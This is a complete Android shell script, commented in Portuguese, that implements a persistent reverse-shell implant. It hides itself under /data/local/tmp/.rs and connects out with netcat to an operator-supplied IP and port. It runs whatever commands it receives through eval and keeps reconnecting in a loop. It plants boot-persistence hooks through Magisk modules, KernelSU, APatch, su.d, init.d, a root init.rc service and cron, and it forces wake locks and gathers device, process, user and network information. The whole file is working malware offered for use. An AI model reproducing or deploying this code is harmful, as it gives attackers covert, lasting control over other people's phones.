#!/system/bin/sh
# rs.sh - reverse shell com persistencia total para Android stock (mksh/toybox)
# sem Termux. Boot persistence exige root. Shell remoto via nc do toybox.
# uso: sh rs.sh <ip>:<porta>   |   sh rs.sh persist

HOST=""
PORT=""
BASE="/data/local/tmp/.rs"
PIDF="$BASE/pid"
FIFO="$BASE/fifo"
CFG="$BASE/cfg"
LOG="$BASE/log"
CWD="/"

SU=""
NC=""
ROOT=0

# ------------------------------------------------------------------ setup
mkdir -p "$BASE" 2>/dev/null
chmod 700 "$BASE" 2>/dev/null

command -v su >/dev/null 2>&1 && SU=$(command -v su)
[ -n "$SU" ] && $SU -c id 2>/dev/null | grep -q "uid=0" && ROOT=1

if command -v nc >/dev/null 2>&1; then
  NC="nc"
elif toybox nc --help >/dev/null 2>&1; then
  NC="toybox nc"
fi

asroot() { # asroot '<cmd>'
  if [ -n "$SU" ]; then $SU -c "$1" 2>/dev/null; else eval "$1" 2>/dev/null; fi
}

w() { # w <path> [mode]  < conteudo
  _p="$1"; _m="${2:-755}"; _d=$(dirname "$_p")
  if [ -n "$SU" ]; then
    $SU -c "mkdir -p '$_d' && cat > '$_p' && chmod $_m '$_p'" 2>/dev/null
  else
    mkdir -p "$_d" 2>/dev/null && cat > "$_p" 2>/dev/null && chmod "$_m" "$_p" 2>/dev/null
  fi
}

remount_rw() {
  [ -n "$SU" ] || return 1
  $SU -c "mount -o rw,remount / 2>/dev/null; mount -o rw,remount /system 2>/dev/null" >/dev/null 2>&1
  $SU -c "touch /system/.rw 2>/dev/null && rm -f /system/.rw" >/dev/null 2>&1
}

# ------------------------------------------------------------------ endpoint
load_cfg() {
  [ -f "$CFG" ] || return 0
  _c=$(cat "$CFG" 2>/dev/null)
  case "$_c" in
    *:*) HOST=${_c%%:*}; PORT=${_c##*:} ;;
  esac
}

save_cfg() {
  [ -n "$HOST" ] && [ -n "$PORT" ] && printf '%s:%s\n' "$HOST" "$PORT" > "$CFG" 2>/dev/null
}

parse_arg() {
  case "$1" in
    *:*)
      HOST=${1%%:*}
      PORT=${1##*:}
      case "$PORT" in ''|*[!0-9]*) PORT=4444 ;; esac
      [ -z "$HOST" ] && HOST=0.0.0.0
      save_cfg
      ;;
  esac
}

# ------------------------------------------------------------------ payload
# copia o proprio script para caminho estavel e oculto
SELF=$(readlink -f "$0" 2>/dev/null)
[ -z "$SELF" ] && SELF="$0"
PAYLOAD="$BASE/rs.sh"
if [ -f "$SELF" ] && [ "$SELF" != "$PAYLOAD" ]; then
  cp -f "$SELF" "$PAYLOAD" 2>/dev/null
fi
chmod 755 "$PAYLOAD" 2>/dev/null

LAUNCH="$BASE/launch.sh"

write_launcher() {
  cat <<'EOS' | w "$LAUNCH" 755
#!/system/bin/sh
BASE=/data/local/tmp/.rs
if [ -f "$BASE/pid" ]; then
  p=$(cat "$BASE/pid" 2>/dev/null)
  [ -n "$p" ] && kill -0 "$p" 2>/dev/null && exit 0
fi
command -v svc >/dev/null 2>&1 && svc power stayon true 2>/dev/null
[ -w /sys/power/wake_lock ] && echo rs > /sys/power/wake_lock 2>/dev/null
cd /
setsid /system/bin/sh "$BASE/rs.sh" >/dev/null 2>&1 &
echo $! > "$BASE/pid"
exit 0
EOS
  chmod 755 "$LAUNCH" 2>/dev/null
  $SU -c "chmod 755 $LAUNCH" 2>/dev/null
}

# ------------------------------------------------------------------ vetores
v_module() {
  d=/data/adb/modules/rs
  [ -d /data/adb/modules ] || { echo "-"; return 1; }
  {
    echo "id=rs"
    echo "name=rs"
    echo "version=1.0"
    echo "versionCode=1"
    echo "author=rs"
    echo "description=resilient reverse shell"
  } | w "$d/module.prop" 644 || return 1

  cat <<EOS | w "$d/service.sh" 755
#!/system/bin/sh
sleep 25
$LAUNCH
EOS

  cat <<EOS | w "$d/post-fs-data.sh" 755
#!/system/bin/sh
( sleep 8; $LAUNCH ) &
EOS

  cat <<EOS | w "$d/boot-completed.sh" 755
#!/system/bin/sh
$LAUNCH
EOS

  $SU -c "chmod 755 $d/*.sh" 2>/dev/null
  echo "ok"
}

v_service_d() {
  [ -d /data/adb/service.d ] || { echo "-"; return 1; }
  printf '#!/system/bin/sh\nsleep 30\n%s\n' "$LAUNCH" | w /data/adb/service.d/rs.sh 755 || { echo "fail"; return 1; }
  echo "ok"
}

v_post_fs_data_d() {
  [ -d /data/adb/post-fs-data.d ] || { echo "-"; return 1; }
  printf '#!/system/bin/sh\n( sleep 5; %s ) &\n' "$LAUNCH" | w /data/adb/post-fs-data.d/rs.sh 755 || { echo "fail"; return 1; }
  echo "ok"
}

v_ksu() {
  [ -d /data/adb/ksu ] || { echo "-"; return 1; }
  printf '#!/system/bin/sh\n%s\n' "$LAUNCH" | w /data/adb/ksu/service.d/rs.sh 755 || { echo "fail"; return 1; }
  echo "ok"
}

v_apatch() {
  [ -d /data/adb/ap ] || { echo "-"; return 1; }
  printf '#!/system/bin/sh\n%s\n' "$LAUNCH" | w /data/adb/ap/service.d/rs.sh 755 || { echo "fail"; return 1; }
  echo "ok"
}

v_sud() {
  hit=0
  for d in /system/su.d /su/su.d /data/su.d; do
    [ -d "$d" ] || continue
    printf '#!/system/bin/sh\n%s\n' "$LAUNCH" | w "$d/rs.sh" 755 && hit=1
  done
  [ $hit -eq 1 ] && { echo "ok"; return 0; }
  echo "-"; return 1
}

v_initd() {
  hit=0
  for d in /system/etc/init.d /etc/init.d; do
    [ -d "$d" ] || continue
    printf '#!/system/bin/sh\n%s\n' "$LAUNCH" | w "$d/rs" 755 && hit=1
  done
  [ $hit -eq 1 ] && { echo "ok"; return 0; }
  echo "-"; return 1
}

v_init_rc() {
  [ -d /system/etc/init ] || { echo "-"; return 1; }
  remount_rw || { echo "sem rw"; return 1; }
  cat <<EOS | w /system/etc/init/rs.rc 644 || { echo "fail"; return 1; }
service rs_shell /system/bin/sh $LAUNCH
    class late_start
    user root
    group root
    oneshot
    disabled
on property:sys.boot_completed=1
    start rs_shell
EOS
  echo "ok"
}

v_crond() {
  toybox crond --help >/dev/null 2>&1 || { echo "-"; return 1; }
  mkdir -p "$BASE/cron" 2>/dev/null
  printf '@reboot %s\n' "$LAUNCH" > "$BASE/cron/root" 2>/dev/null || { echo "fail"; return 1; }
  chmod 600 "$BASE/cron/root" 2>/dev/null
  echo "ok"
}

v_tmp_hook() {
  # sem root: nada persiste no boot; deixa rearme rapido por adb/wireless
  cat <<EOS | w "$BASE/rearm.sh" 755 || { echo "-"; return 1; }
#!/system/bin/sh
exec /system/bin/sh $LAUNCH
EOS
  echo "ok"
}

apply_all() {
  write_launcher
  {
    echo "== rs persist $(date 2>/dev/null) =="
    echo "root=$ROOT nc=$NC"
    for v in v_module v_service_d v_post_fs_data_d v_ksu v_apatch v_sud v_initd v_init_rc v_crond v_tmp_hook; do
      printf '%-18s %s\n' "$v" "$($v)"
    done
  } | tee "$LOG" 2>/dev/null
  chmod 600 "$LOG" 2>/dev/null
}

# ------------------------------------------------------------------ builtins
help_text() {
cat <<'EOS'
=============================================
 rs.sh - comandos
=============================================
 help      este menu
 sysinfo   dispositivo / build / id / espaco
 tasks     processos
 users     usuarios android
 netstat   conexoes ativas
 persist   reaplicar todos os vetores de boot
 log       log da ultima persistencia
 wake      stayon + wakelock
 battery   dumpsys battery
 root      estado do root
 cd <dir>  troca diretorio
 exit      encerra sessao
=============================================
EOS
}

do_sysinfo() {
  uname -a
  id
  for p in ro.product.manufacturer ro.product.model ro.build.version.release ro.build.version.sdk ro.build.type; do
    v=$(getprop "$p" 2>/dev/null); [ -n "$v" ] && echo "$p=$v"
  done
  df /data 2>/dev/null | tail -n 1
  getenforce 2>/dev/null
}

do_tasks() {
  if ps -A -o PID,USER,NAME >/dev/null 2>&1; then
    ps -A -o PID,USER,NAME
    return
  fi
  echo "PID CMD"
  for d in /proc/[0-9]*; do
    [ -r "$d/cmdline" ] || continue
    echo "${d#/proc/} $(tr '\0' ' ' < "$d/cmdline" 2>/dev/null)"
  done
}

do_users() {
  pm list users 2>/dev/null || cat /data/system/users/userlist.xml 2>/dev/null || echo "sem acesso"
}

do_net() {
  if command -v ss >/dev/null 2>&1; then ss -tunap 2>/dev/null && return; fi
  if command -v netstat >/dev/null 2>&1; then netstat -an 2>/dev/null && return; fi
  cat /proc/net/tcp /proc/net/tcp6 2>/dev/null
}

do_wake() {
  svc power stayon true 2>/dev/null
  [ -w /sys/power/wake_lock ] && echo rs > /sys/power/wake_lock 2>/dev/null
  echo "wake aplicado"
}

# ------------------------------------------------------------------ sessao
handle() {
  cd "$CWD" 2>/dev/null
  while IFS= read -r line; do
    line=$(printf '%s' "$line" | tr -d '\r')
    [ -z "$line" ] && continue
    case "$line" in
      exit) printf 'Sessao encerrada.\n' >&3; break ;;
      help) help_text >&3 ;;
      sysinfo) do_sysinfo >&3 2>&1 ;;
      tasks) do_tasks >&3 2>&1 ;;
      users) do_users >&3 2>&1 ;;
      netstat) do_net >&3 2>&1 ;;
      root) printf 'root=%s su=%s nc=%s\n' "$ROOT" "$SU" "$NC" >&3 ;;
      log) cat "$LOG" >&3 2>/dev/null ;;
      persist) apply_all >&3 2>&1 ;;
      wake) do_wake >&3 2>&1 ;;
      battery) dumpsys battery >&3 2>&1 ;;
      cd\ *)
        _d=$(eval echo "${line#cd }")
        if cd "$_d" 2>/dev/null; then
          CWD=$(pwd); printf '%s\n' "$CWD" >&3
        else
          printf 'diretorio invalido\n' >&3
        fi
        ;;
      *)
        ( eval "$line" ) >&3 2>&1
        ;;
    esac
    printf '\n--rs--\n' >&3
  done
}

connect() {
  [ -n "$NC" ] || { echo "nc ausente" >&2; return 1; }
  rm -f "$FIFO" 2>/dev/null
  mkfifo "$FIFO" 2>/dev/null || return 1
  exec 3> "$FIFO"
  if [ "$NC" = "toybox nc" ]; then
    toybox nc -w 10 "$HOST" "$PORT" < "$FIFO" | handle
  else
    nc -w 10 "$HOST" "$PORT" < "$FIFO" | handle
  fi
  exec 3>&-
  rm -f "$FIFO" 2>/dev/null
}

# ------------------------------------------------------------------ main
load_cfg
[ -n "$1" ] && parse_arg "$1"

case "$1" in
  persist) apply_all; exit 0 ;;
  "" ) : ;;
  *:* ) : ;;
esac

if [ -z "$HOST" ] && [ -t 0 ]; then
  printf 'IP do listener [0.0.0.0]: '; read -r HOST
  printf 'Porta [4444]: '; read -r PORT
  [ -z "$HOST" ] && HOST=0.0.0.0
  case "$PORT" in ''|*[!0-9]*) PORT=4444 ;; esac
  save_cfg
fi
[ -z "$HOST" ] && HOST=0.0.0.0
[ -z "$PORT" ] && PORT=4444

apply_all >/dev/null 2>&1
echo $$ > "$PIDF" 2>/dev/null
do_wake >/dev/null 2>&1

while :; do
  connect
  sleep $(( (RANDOM % 8) + 4 ))
done
